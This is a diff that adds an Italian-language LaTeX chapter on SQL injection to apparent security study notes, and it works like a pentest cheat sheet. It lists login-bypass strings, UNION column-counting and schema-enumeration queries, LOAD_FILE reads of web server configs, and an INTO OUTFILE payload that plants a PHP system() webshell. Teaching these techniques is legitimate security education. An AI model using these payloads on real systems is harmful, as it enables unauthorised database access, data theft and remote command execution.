@@ -144,4 +144,221 @@
 \input{swsecurity.tex}
 \input{terminale.tex}
 \input{cryptography.tex}
+\chapter{SQL injection}
+\section{Introduzione}
+Gli attacchi di tipo SQL Injection rappresentano una delle più insidiose minacce in applicazioni che adottano l'utilizzo di un databse relazionele. Si tratta di una vulnerabilità che sfrutta lacune nella gestione dei dati da parte di un'applicazione web per inserire o manipolare comandi SQL non autorizzati. L'obiettivo principale di questo tipo di attacco è quello di compromettere e ottenere accesso non autorizzato al database sottostante.
+Questa tipologia di attacco può verificarsi in molteplici contesti, ma spesso si manifesta quando gli sviluppatori non implementano in modo corretto la validazione degli input o trascurano l'utilizzo di  parametri sicuri nei comandi SQL (prepared statements).
+
+\section{Funzionamento}
+Una SQL injection come detto in precedenza si verifica quando l'input dell'utente viene inserito all'interno di una query string senza essere sanitizzato o filtrato. Vediamo un esempio di query che non utilizza nessuna forma di sanitizzazione:
+
+\subsection{Esempio}
+Analizziamo il seguente codice utilizzato per fare il login:
+\begin{lstlisting}
+    $user = mysql_query(
+        "SELECT * FROM users
+         WHERE username='" .$_POST['username']. "'
+         AND password='" .$_POST['password']. "'
+    );
+\end{lstlisting}
+In una richiesta normale i valori di username e password vengono inseriti nella query tramite concatenazione di stringhe quindi se ad esempio abbiamo l'utente:
+\begin{itemize}
+    \item username: admin, password: 123456
+\end{itemize}
+la query precedente diventerà così:
+\begin{lstlisting}
+    SELECT * FROM users
+    WHERE username='admin'
+    AND password='123456'
+\end{lstlisting}
+
+Aggiungendo un singolo apice nell'username provochiamo un errore di sintassi, potendo quindi scappare dagli apici è possibile iniettare del codice SQL. Per bypassare questo errore di sintassi è possibile inserire dei commenti o altri apici in modo da evitare l'errore.
+
+\begin{lstlisting}
+    SELECT * FROM users
+    WHERE username='admin''--
+    AND password='123456'
+\end{lstlisting}
+
+\section{Bypass dell'autenticazione}
+Quando ci troviamo davanti ad un form di login che vogliamo bypassare per prima cosa dobbiamo verificare che se il form è vulnerabile ad una SQL injection. Per far ciò ci basta inserire uno dei seguenti paylod dopo l'username e vedere se causa errori o cambiamenti nel comportamento della pagina.
+
+\begin{table}[h]
+  \centering
+  \resizebox{0.5\textwidth}{!}{
+    \begin{tabular}{|c|c|}
+      \hline
+      Payload & URL Encoding \\
+      \hline
+      ' & \%27 \\
+      " & \%22 \\
+      \# & \%23 \\
+      ; & \%3B \\
+      ) & \%29 \\
+      \hline
+    \end{tabular}
+  }
+  \caption{Payload per scoprire la vulnerabilità}
+\end{table}
+
+\section{Payload per il bypass}
+\textbf{Importante} il trattino finale server ad indicare la presenza di uno spazio bianco dopo l'inserimento di un commento.
+\begin{itemize}
+    \item \begin{verbatim} ' OR 1 -- - \end{verbatim}
+    \item \begin{verbatim} ' OR 1 = 1 -- - \end{verbatim}
+    \item \begin{verbatim} ' OR '1' = '1'\end{verbatim}
+    \item \begin{verbatim} '=0-- -\end{verbatim}
+    \item \begin{verbatim} utente'-- - \end{verbatim} 
+\end{itemize}
+Nota: utente deve essere l'username di un utente del sistema. Se il form che vogliamo bypassare ci mostra errori di sintassi nella query SQL dobbiamo aggiustare il nostro codice in modo da risolvere questi errori.
+
+
+\section{Union injection}
+L'operatore UNION può lavorare solo con SELECT che ritornano lo stesso numero di colonne. Nel caso in cui la query eseguita dal sistema ritorni più colonne di quelle della quey che vogliamo eseguire noi in UNION dobbiamo inserire dei dati fantocci.
+
+Esempio: Supponiamo che la query eseguita dal sistema sia fatta così:
+\begin{verbatim}
+    SELECT name, price FROM products WHERE product_id = '1';
+\end{verbatim}
+se noi vogliamo eseguire in UNION la seguente query:
+\begin{verbatim}
+    SELECT username from password;
+\end{verbatim}
+il sistema darà un errore, poichè il numero delle colonne non è uguale. Per risolvere il problema dobbiamo inserire dei dati fantoccio come di seguito:
+\begin{verbatim}
+    SELECT name, price FROM products WHERE product_id = '1' 
+    UNION
+    SELECT username,2 from password;
+\end{verbatim}
+ovviamente dobbiamo inserire tanti dati fittizi quante sono le colonne ritornate dalla SELECT fatta dal sistema.
+
+\subsection{Trovare il numero di colonne selezionate dal server}
+Per trovare il numero di colonne selezionate dal server ci sono due metodi:
+\begin{itemize}
+    \item usare la clausola \textbf{ORDER BY}
+    \item usare la clausola \textbf{UNION}
+\end{itemize}
+
+\subsubsection{Order By}
+Utilizziamo il seguente payload e continuiamo a cercare di ordinare il risultato per le varie colonne (e.g. 1,2,3,..) fino a che non otteniamo un errore. Il numero a cui siamo arrivati prima dell'errore ci indica il numero esatto di colonne della tabella.
+\begin{itemize}
+    \item \begin{verbatim}'order by 1-- -\end{verbatim}
+\end{itemize}
+
+\subsubsection{Union}
+L'altro metodo consiste nel tentare un'iniezione di Union con un numero diverso di colonne, finché non si ottengono i risultati con successo. Il primo metodo restituisce sempre i risultati finché non si verifica un errore, mentre questo metodo dà sempre un errore finché non si ha successo.
+\begin{itemize}
+    \item \begin{verbatim} UNION select 1,2,3-- -\end{verbatim}
+\end{itemize}
+
+\subsubsection{Attenzione}
+Mentre una query può restituire più colonne, l'applicazione web può visualizzarne solo alcune. Pertanto, se iniettiamo la nostra query in una colonna che non viene stampata sulla pagina, non otterremo il suo output. Per questo motivo, è necessario determinare quali colonne vengono stampate sulla pagina, per stabilire dove posizionare la nostra iniezione.
+
+\section{Database enumeration}
+Prima di enumerare il database, di solito è necessario identificare il tipo di DBMS con cui si ha a che fare. 
+Come ipotesi iniziale, se il server web che vediamo nelle risposte HTTP è Apache o Nginx, è probabile che il server web sia in esecuzione su Linux, quindi il DBMS è probabilmente MySQL. Lo stesso vale per i DBMS Microsoft se il webserver è IIS, quindi è probabile che si tratti di MSSQL. Tuttavia, si tratta di un'ipotesi azzardata, poiché molti altri database possono essere utilizzati sia sul sistema operativo che sul server web. Esistono quindi diverse query che possiamo testare per individuare il tipo di database con cui abbiamo a che fare.
+
+\subsection{Payloads}
+\begin{itemize}
+    \item \begin{verbatim}SELECT @@version\end{verbatim}
+    \begin{itemize}
+        \item utilizzabile quando abbiamo l'output completo della query, ritorna la versione del database mySQL
+    \end{itemize}
+    \item \begin{verbatim}SELECT POW(1,1)\end{verbatim}
+    \begin{itemize}
+        \item utilizzabile solo quando abbiamo output numerico. Ritorna 1.
+    \end{itemize}
+    \item \begin{verbatim}SELECT SLEEP(5)\end{verbatim}
+    \begin{itemize}
+        \item ritarda la risposta per 5 secondi e ritorna 0.
+    \end{itemize}
+\end{itemize}
+
+\subsection{INFORMATION\_SCHEMA Database}
+Per poter recuperare dei dati utilizzando la UNION dobbiamo scrivere in modo corretto la nostra query. Per farlo dobbiamo conoscere le seguenti informazioni:
+\begin{itemize}
+    \item lista dei database
+    \item lista delle tabelle all'interno di ogni database
+    \item lista delle colonne di ogni tabella
+\end{itemize}
+Il database INFORMATION\_SCHEMA contiene metadati sulle tabelle presenti all'interno del server.
+
+\subsubsection{QUERY utili}
+\begin{itemize}
+    \item trovare il nome dei database
+    \begin{verbatim}
+        SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
+    \end{verbatim}
+    \item trovare il nome delle tabelle all'interno di un database
+    \begin{verbatim}
+        SELECT TABLE_NAME, TABLE_SCHEMA 
+        FROM INFORMATION_SCHEMA.TABLES 
+        WHERE table_schema='nomeDb'
+    \end{verbatim}
+    \item trovare le colonne di una determinata tabella
+    \begin{verbatim}
+        SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA 
+        FROM INFORMATION_SCHEMA.COLUMNS 
+        WHERE table_name='nomeTabella'
+    \end{verbatim}
+\end{itemize}
+
+\section{Lettura di file}
+Prima di poter leggere dei file dobbiamo verificare i permessi del nostro utente. Per torvare il nostro utente corrente possiamo usare:
+\begin{itemize}
+    \item USER()
+    \item CURRENT\_USER()
+\end{itemize}
+Per vedere quindi i privilegi del nostro utente usiamo:
+\begin{itemize}
+    \item per verificare se siamo super user (ritorna Y se vero)
+    \begin{verbatim}
+        SELECT super_priv FROM mysql.user
+    \end{verbatim}
+    \item per verificare tutti i permessi legati al nostro utente
+    \begin{verbatim}
+        SELECT grantee, privilege_type 
+        FROM information_schema.user_privileges 
+        WHERE grantee="user"
+    \end{verbatim}
+\end{itemize}
+
+Dopo aver controllato di essere in possesso dei privilegi corretti scriviamo:
+\begin{verbatim}
+    SELECT LOAD_FILE('path')
+\end{verbatim}
+per caricare il file desiderato.
+
+\section{Scrittura di file}
+Per essere in grado di scrivere file nel back-end usando un database MySQL abbiamo bisogno di tre cose:
+\begin{enumerate}
+    \item un utente con il permesso FILE
+    \item la variabile secure\_file\_priv non deve essere attiva
+    \item dobbiamo avere accesso alla directory dove vogliamo scrivere sul back-end
+\end{enumerate}
+La variabile secure\_file\_priv server per determinare da dove possiamo leggere/scrivere file. Se questa è vuota vuol dire che possiamo leggere/scrivere ovunque, se invece contiene un certo percorso allora siamo limitati a quella cartella; se settata a NULL non possiamo leggere/scrivere da nessuna parte. Possiamo trovare il valore della variabile con il seguente comando:
+\begin{verbatim}
+    SELECT variable_name, variable_value 
+    FROM information_schema.global_variables 
+    WHERE variable_name="secure_file_priv"
+\end{verbatim}
+
+Dopo aver verificato i permessi usiamo il comando:
+\begin{verbatim}
+    select 'testo da scrivere' into outfile 'percorso/nomefile.txt'
+\end{verbatim}
+
+\subsection{Scrittura di una WebShell sul back-end}
+\begin{itemize}
+    \item inserimento nel back-end di una piccola webshell per eseguire comandi del sistema
+    \begin{verbatim}
+        ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" 
+        into outfile '/var/www/html/shell.php'-- -
+    \end{verbatim}
+\end{itemize}
+Questa semplice webshell prenderà i comandi che gli vengono passati nel'url nel seguente modo: url/shell-php?0=comando.
+
+\subsection{NOTA}
+Per scrivere una shell web all'interno del back-end, dobbiamo conoscere la directory web di base del server web (cioè la root web). Un modo per trovarla è usare load\_file per leggere la configurazione del server, come quella di Apache che si trova in \path{/etc/apache2/apache2.conf}, quella di Nginx in \path{/etc/nginx/nginx.conf} o quella di IIS in \path{%WinDir%System32\Inetsrv\Config\ApplicationHost.config}
+
 \end{document}
